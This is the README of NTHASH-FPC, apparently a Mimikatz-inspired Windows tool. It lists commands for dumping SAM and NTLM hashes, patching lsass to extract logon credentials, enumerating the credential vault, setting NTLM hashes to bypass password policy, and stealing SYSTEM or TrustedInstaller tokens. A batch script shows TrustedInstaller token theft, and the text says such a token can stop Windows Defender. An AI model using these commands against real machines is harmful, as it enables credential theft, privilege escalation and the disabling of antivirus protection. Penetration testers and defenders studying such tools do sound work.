# NTHASH-FPC <br/>
A tribute to Mimikatz... <br/>
<br/>
Command line as below: <br/>
NTHASH /setntlm [/server:hostname] /user:username /newhash:xxx <br/>
NTHASH /setntlm [/server:hostname] /user:username /newpwd:xxx <br/>
NTHASH /changentlm [/server:hostname] /user:username /oldpwd:xxx /newpwd:xxx <br/>
NTHASH /changentlm [/server:hostname] /user:username /oldhash:xxx /newpwd:xxx <br/>
NTHASH /changentlm [/server:hostname] /user:username /oldpwd:xxx /newhash:xxx <br/>
NTHASH /changentlm [/server:hostname] /user:username /oldhash:xxx /newhash:xxx <br/>
NTHASH /gethash /password:password <br/>
NTHASH /getsid /user:username [/server:hostname] <br/>
NTHASH /getusers [/server:hostname] <br/>
NTHASH /getdomains [/server:hostname <br/>
NTHASH /dumpsam <br/>
NTHASH /dumphashes [/offline] <br/>
NTHASH /dumphash /rid:123 [/offline] <br/>
NTHASH /getsamkey [/offline] <br/>
NTHASH /getsyskey [/offline] <br/>
NTHASH /getlsakeys <br/>
NTHASH /wdigest <br/>
NTHASH /logonpasswords <br/>
NTHASH /enumcred <br/>
NTHASH /enumcred2 <br/>
NTHASH /enumvault <br/>
NTHASH /cryptunprotectdata /input:filename <br/>
NTHASH /cryptprotectdata /input:string <br/>
NTHASH /runasuser /user:username /password:password [/binary: x:\folder\bin.exe] <br/>
NTHASH /runastoken /pid:12345 [/binary: x:\folder\bin.exe] <br/>
NTHASH /runaschild /pid:12345 [/binary: x:\folder\bin.exe] <br/>
NTHASH /enumpriv <br/>
NTHASH /enumproc <br/>
NTHASH /killproc /pid:12345 <br/>
NTHASH /enummod /pid:12345 <br/>
NTHASH /dumpprocess /pid:12345 <br/>
NTHASH /a_command /verbose <br/>
NTHASH /a_command /system <br/>

<b>changentlm</b>, using a legacy api, may not work if your ntlm hashes are encrypted with AES (i.e starting with win10 1607. <br/>
Credits goes to https://github.com/vletoux/NTLMInjector <br/>

<b>setntlm</b> on the other hand should always work and allow one to bypass password policy.  <br/>
Credits goes to https://github.com/vletoux/NTLMInjector <br/>

<b>dumpsam</b> will temporarily patch a module in lsass to be able to dump your SAM ntlm hashes from the lsass memory (need to cover/test as many windows version as possible). <br/>

<b>dumphash and dumphashes</b> will read the registry - you need to run as system to perform this action <br/>.
Or you can use the /system switch <br/>.
You can also perform this offline (and then no longer require to run as system). <br/>
You can use reg save hklm\sam sam.sav and reg save hklm\system system.sav to generate offline hives. <br/>
Both the RC4 and AES cipher are supported. <br/>
https://www.insecurity.be/blog/2018/01/21/retrieving-ntlm-hashes-and-what-changed-technical-writeup/ is a must read to understand RC4 vs AES. <br/>

<b>enumcred</b> will use CredEnumerate windows API to enumerate the logged on user credentials. <br/>
<b>enumcred2</b> will use CredEnumerate windows API to enumerate the logged on user credentials while also patching lsass to dump all credentials <br/>

<b>enumvault</b> will use vaultcli.dll windows API to enumerate the logged on user vault credentials. <br/>

<b>runastoken</b> can be used to run a process under a system account. <br/>
Once under a system account, you can also "steal" a token from trustedinstaller (net start trustedinstaller before hand. <br/>
Note that you can steal a trustedinstaller token directly by using the /system switch. <br/>
With a trustedinstaller token, you can perform actions like stop windefend (or kill the process, or modify the AV settings, etc). <br/>
See example below where you would start the trustedinstaller service, retrieve its pid and run a process as the account. <br/>
<i>
@echo off <br/>
net start trustedinstaller <br/>
for /F "tokens=1" %%K in ('
   nthash-win64 /enumproc ^| findstr /i "trustedinstaller"
') do (
   nthash-win64 /runastoken /pid:%%K /system
)
<br/>
  </i>

<b>runaschild</b> can be used to run a process as a child of another existing/parent process. <br/>
Note that some apps (like cmd.exe) will crash right after initialization with a c0000142. <br/>
Wierdly enough, loading notepad.exe with this method and then launching cmd.exe from there works...

todo: <br/>
-decrypt sam hashes online (rather than patching lsass) and offline : done in v1.1 <br/>
-deal with new AES cipher used in latest win10 1607 : done in 1.2 <br/>
-enum Lsasrv.dll!LogonSessionList: done in 1.3 <br/>
-enum Wdigest.dll!l_LogSessList: done in 1.3 <br/>
-decrypt dpapi encrypted vault credentials ? <br/>
-patch LogonSessionList and perform pth? <br/>
